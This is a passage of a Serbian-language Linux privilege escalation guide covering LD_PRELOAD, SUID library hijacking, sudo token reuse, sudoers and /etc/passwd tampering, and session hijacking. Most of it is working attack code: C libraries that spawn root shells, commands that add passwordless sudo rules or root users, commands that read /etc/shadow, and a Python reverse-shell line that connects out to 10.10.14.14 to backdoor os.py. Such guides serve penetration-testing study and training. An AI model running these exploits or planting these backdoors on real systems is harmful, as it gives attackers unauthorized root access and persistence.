Eskalacija privilegija može nastati ako imate mogućnost izvršavanja komandi pomoću `sudo`, a izlaz komande `sudo -l` sadrži naredbu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** opstane i bude prepoznata čak i kada se komande izvršavaju pomoću `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvaj kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim ga **kompajlirajte** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Konačno, **eskalirajte privilegije** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD_LIBRARY_PATH** env varijablu, jer kontroliše putanju na kojoj će se biblioteke tražiti.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binary sa **SUID** dozvolama koji deluje neuobičajeno, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. To možete proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za exploitaciju.

Da bi se ovo iskoristilo, potrebno je napraviti C datoteku, na primer _"/path/to/.config/libcalc.c"_, koja sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, nakon kompajliranja i izvršavanja, ima za cilj da podigne privilegije manipulisanjem dozvolama datoteka i izvršavanjem shell-a sa povišenim privilegijama.

Kompajlirajte navedenu C datoteku u shared object (.so) datoteku pomoću:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Konačno, pokretanje pogođene SUID binarne datoteke trebalo bi da aktivira exploit, što može omogućiti kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava library iz foldera u koji možemo da upisujemo, napravićemo library u tom folderu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da ima funkciju koja se zove `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je uređena lista Unix binarnih datoteka koje napadač može da iskoristi za zaobilaženje lokalnih bezbednosnih ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete da **ubacujete samo argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih datoteka koje se mogu zloupotrebiti za izlazak iz ograničenih shell-ova, eskalaciju ili održavanje povišenih privilegija, prenos datoteka, pokretanje bind i reverse shell-ova i obavljanje drugih post-exploitation zadataka.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pristupite komandi `sudo -l`, možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li može da pronađe način za exploitovanje nekog sudo pravila.

### Ponovna upotreba Sudo tokena

U slučajevima kada imate **sudo access**, ali nemate lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršavanje sudo komande, a zatim preuzeti session token**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** za izvršavanje nečega u **poslednjih 15 minuta** (podrazumevano, to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete da ga uploadujete)

(Možete privremeno omogućiti `ptrace_scope` pomoću komande `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajnim izmenama datoteke `/etc/sysctl.d/10-ptrace.conf` i postavljanjem vrednosti `kernel.yama.ptrace_scope = 0`.)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Prvi exploit** (`exploit.sh`) će kreirati binarnu datoteku `activate_sudo_token` u direktorijumu _/tmp_. Možete je koristiti za **aktiviranje sudo tokena u vašoj sesiji** (nećete automatski dobiti root shell, pokrenite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root korisnika sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers datoteku** koja čini **sudo tokene večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u folderu ili nad bilo kojim kreiranim fajlom unutar foldera, možete koristiti binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete da prepišete fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID-om 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku, tako što ćete izvršiti:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar direktorijuma `/etc/sudoers.d` podešavaju ko može da koristi `sudo` i na koji način. Ovi fajlovi **podrazumevano mogu biti pročitani samo od strane korisnika root i grupe root**.\
**Ako** možete da **pročitate** ovaj fajl, možda ćete moći da **dobijete neke zanimljive informacije**, a ako možete da **upišete** bilo koji fajl, moći ćete da **eskalirate privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možete da pišete, možete zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način za zloupotrebu ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative binarnoj datoteci `sudo`, kao što je `doas` za OpenBSD. Ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Ako `doas` dozvoljava editor ili interpreter, proverite GTFOBins-style escapes:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za eskalaciju privilegija i uspeli ste da dobijete shell u kontekstu tog korisnika, možete **kreirati novu sudo izvršnu datoteku** koja će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **izmenite $PATH** korisničkog konteksta (na primer, dodavanjem nove putanje u `.bash_profile`) tako da se, kada korisnik izvrši sudo, izvrši vaša sudo izvršna datoteka.

Imajte na umu da, ako korisnik koristi drugačiji shell (ne bash), moraćete da izmenite druge datoteke kako biste dodali novu putanju. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Drugi primer možete pronaći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečega poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` pokazuje **odakle potiču učitane konfiguracione datoteke**. Ova datoteka obično sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf` biti pročitane. Ove konfiguracione datoteke **upućuju na druge fascikle** u kojima će se **pretraživati** **biblioteke**. Na primer, sadržaj datoteke `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem pretraživati biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za pisanje** nad bilo kojom od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojom datotekom unutar `/etc/ld.so.conf.d/` ili bilo kojom fasciklom navedenom u konfiguracionoj datoteci unutar `/etc/ld.so.conf.d/*.conf`, možda će moći da izvrši privilege escalation.\
Pogledajte **kako da exploit-ujete ovu misconfiguration** na sledećoj stranici:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib-a u `/var/tmp/flag15/`, program će ga koristiti na ovoj lokaciji, kao što je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities pružaju **podskup dostupnih root privilegija procesu**. Ovo efektivno deli root **privilegije na manje i zasebne jedinice**. Svaka od ovih jedinica zatim može nezavisno da se dodeli procesima. Na ovaj način se kompletan skup privilegija smanjuje, čime se umanjuju rizici od exploitation-a.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i načinima njihove zloupotrebe**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "execute"** podrazumeva da korisnik na koga se odnosi može da uradi "**cd**" u folder.\
**"read"** bit podrazumeva da korisnik može da **izlista** **fajlove**, a **"write"** bit podrazumeva da korisnik može da **obriše** i **kreira** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj discretionary dozvola, koji može da **nadjača tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu nad pristupom fajlovima ili direktorijumima tako što omogućavaju ili uskraćuju prava konkretnim korisnicima koji nisu vlasnici niti članovi grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Više detalja možete pronaći [**ovde**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodelite** korisniku "kali" dozvole za čitanje i upis nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pronađite** datoteke sa određenim ACL-ovima na sistemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Hidden ACL backdoor u sudoers drop-in datotekama

Česta pogrešna konfiguracija je fajl u vlasništvu root korisnika u `/etc/sudoers.d/` sa režimom `440`, koji ipak putem ACL-a daje pristup za upis korisniku sa niskim privilegijama.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ako vidite nešto poput `user:alice:rw-`, korisnik može da doda sudo pravilo uprkos restriktivnim bitovima režima:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Ovo je ACL persistence/privesc putanja sa velikim uticajem, jer se lako može prevideti tokom provera koje se oslanjaju samo na `ls -l`.

## Otvorene shell sesije

U **starim verzijama** možete **preoteti** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da se **povežete** na screen sesije samo svog korisnika. Međutim, unutar **sesije** možete pronaći **zanimljive informacije**.

### screen sessions hijacking

**Izlistajte screen sesije**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Lokacije socket-a (neki sistemi jednu izlažu kao simboličku vezu ka drugoj): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Povezivanje sa sesijom**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Hijacking tmux sesija

Ovo je bio problem sa **starim verzijama tmux-a**. Nisam uspeo da preuzmem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovani korisnik.

**Izlistajte tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Lokacije socket-a (neki sistemi izlažu jedan kao symlink drugog) - hijacking tmux sesija: tmux -S /tmp/dev sess ls Prikažite listu koristeći taj socket, možete pokrenuti tmux sesiju na tom socket-u...](<../../images/image (837).png>)

**Prikačite se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Pogledajte **Valentine box from HTB** kao primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima zasnovanim na Debianu (Ubuntu, Kubuntu itd.) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bugom.\
Ovaj bug nastaje prilikom kreiranja novog ssh ključa u tim OS-ovima, jer je bilo moguće samo **32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i da **pomoću ssh javnog ključa možete pronaći odgovarajući privatni ključ**. Izračunate mogućnosti možete pronaći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Određuje da li je autentifikacija lozinkom dozvoljena. Podrazumevana vrednost je `no`.
- **PubkeyAuthentication:** Određuje da li je autentifikacija javnim ključem dozvoljena. Podrazumevana vrednost je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavljivanje na naloge sa praznim lozinkama. Podrazumevana vrednost je `no`.

### Login control files

Ovi fajlovi utiču na to ko može da se prijavi i na koji način:

- **`/etc/nologin`**: ako postoji, blokira prijavljivanje korisnika koji nisu root i prikazuje njegovu poruku.
- **`/etc/securetty`**: ograničava gde root može da se prijavi (TTY allowlist).
- **`/etc/motd`**: banner nakon prijavljivanja (može da leak-uje informacije o okruženju ili održavanju).

### PermitRootLogin

Određuje da li root može da se prijavi koristeći ssh; podrazumevana vrednost je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći lozinku i privatni ključ
- `without-password` ili `prohibit-password`: root može da se prijavi samo pomoću privatnog ključa
- `forced-commands-only`: Root može da se prijavi samo pomoću privatnog ključa i ako su navedene opcije za komande
- `no` : ne

### AuthorizedKeysFile

Određuje fajlove koji sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može sadržati tokene poput `%h`, koji će biti zamenjeni home direktorijumom. **Možete navesti apsolutne putanje** (koje počinju znakom `/`) ili **relativne putanje u odnosu na home direktorijum korisnika**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će ukazati na to da će, ako pokušate da se prijavite **private** ključem korisnika "**testusername**", ssh uporediti **public key** vašeg ključa sa ključevima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding omogućava vam da **koristite svoje lokalne SSH ključeve umesto da ostavljate ključeve** (bez passphrase-a!) na serveru. Tako ćete moći da **preskočite** putem ssh-a **na host** i da odatle **preskočite na drugi** host **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Ovu opciju treba da podesite u `$HOME/.ssh.config` na sledeći način:
```
Host example.com
ForwardAgent yes
```
Imajte na umu da će, ako je `Host` postavljen na `*`, svaki put kada korisnik pređe na drugu mašinu ta mašina moći da pristupi ključevima (što predstavlja bezbednosni problem).

Datoteka `/etc/ssh_config` može **nadjačati ove opcije** i dozvoliti ili odbiti ovu konfiguraciju.\
Datoteka `/etc/sshd_config` može **dozvoliti ili odbiti** prosleđivanje ssh-agent-a pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako utvrdite da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer ćete **možda moći da ga zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljive datoteke

### Datoteke profila

Datoteka `/etc/profile` i datoteke unutar `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Zato, ako možete da **upišete sadržaj u bilo koju od njih ili je izmenite, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako pronađete bilo koji neobičan script profila, trebalo bi da ga proverite zbog **osetljivih detalja**.

### Passwd/Shadow Files

U zavisnosti od OS-a, datoteke `/etc/passwd` i `/etc/shadow` mogu koristiti drugačiji naziv ili može postojati backup. Zato se preporučuje da **pronađete sve** i **proverite da li možete da ih čitate** kako biste videli **da li se u datotekama nalaze hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim slučajevima možete pronaći **hash vrednosti lozinki** unutar datoteke `/etc/passwd` (ili ekvivalentne datoteke)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i dodajte generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Npr.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće redove da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: možete ugroziti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi u `/etc/pwd.db` i `/etc/master.passwd`, dok je `/etc/shadow` preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete da **upisujete u neke osetljive fajlove**. Na primer, da li možete da upisujete u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete da **izmenite konfiguracionu datoteku Tomcat servisa unutar /etc/systemd/,** tada možete izmeniti linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će biti izvršen sledeći put kada tomcat bude pokrenut.

### Provera direktorijuma

Sledeći direktorijumi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobične lokacije/fajlovi u vlasništvu
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjeni fajlovi u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB datoteke
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skrivene datoteke
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binarne datoteke u PATH-u**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Veb datoteke**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih datoteka koje mogu sadržati lozinke**.\
**Još jedan zanimljiv alat** koji možete koristiti u tu svrhu je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), open source aplikacija koja se koristi za preuzimanje velikog broja lozinki sačuvanih na lokalnom računaru za Windows, Linux i Mac.

### Logovi

Ako možete da čitate logove, možda ćete moći da pronađete **zanimljive/poverljive informacije unutar njih**. Što je log neobičniji, to će verovatno biti zanimljiviji.\
Takođe, neki "**loše**" konfigurisani (backdoored?) **audit logovi** mogu omogućiti da **beležite lozinke** unutar audit logova, kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste **čitali logove, grupa** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **će biti veoma korisna.**

### Shell datoteke
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe bi trebalo da proverite fajlove koji sadrže reč "**password**" u svom **nazivu** ili unutar **sadržaja**, kao i da proverite IP adrese i email adrese unutar logova ili pomoću regex izraza za hash vrednosti.\
Ovde neću navoditi kako se sve ovo radi, ali ako vas zanima, možete proveriti poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Writable files

### Python library hijacking

Ako znate **odakle** će python skripta biti pokrenuta i **možete da pišete unutar** te fascikle ili možete da **izmenite python biblioteke**, možete izmeniti OS biblioteku i postaviti joj backdoor (ako možete da pišete u fasciklu iz koje će python skripta biti pokrenuta, kopirajte i nalepite biblioteku os.py).

Da biste **postavili backdoor u biblioteku**, samo dodajte sledeću liniju na kraj biblioteke os.py (promenite IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Ranljivost u `logrotate` omogućava korisnicima sa **dozvolama za pisanje** nad datotekom evidencije ili njenim nadređenim direktorijumima da potencijalno dobiju eskalirane privilegije. To je zato što se `logrotate` često pokreće kao **root** i može biti izmanipulisan da izvršava proizvoljne datoteke, naročito u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_, već i u svakom direktorijumu na koji se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` verzije `3.18.0` i starije

Detaljnije informacije o ranjivosti možete pronaći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična ranjivosti [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** zato, kada god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i da li možete eskalirati privilegije zamenom logova simboličkim linkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenca ranjivosti:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako korisnik iz bilo kog razloga može da **upisuje** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može da **izmeni** postojeću, onda je vaš **system is pwned**.

Network scripts, na primer _ifcg-eth0_, koriste se za mrežne veze. Izgledaju potpuno isto kao .INI datoteke. Međutim, Network Manager ih na Linuxu \~sourced\~ (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network scripts nije pravilno obrađen. Ako u nazivu postoji **beli/prazan prostor, sistem pokušava da izvrši deo nakon belog/praznog prostora**. To znači da se **sve nakon prvog praznog prostora izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
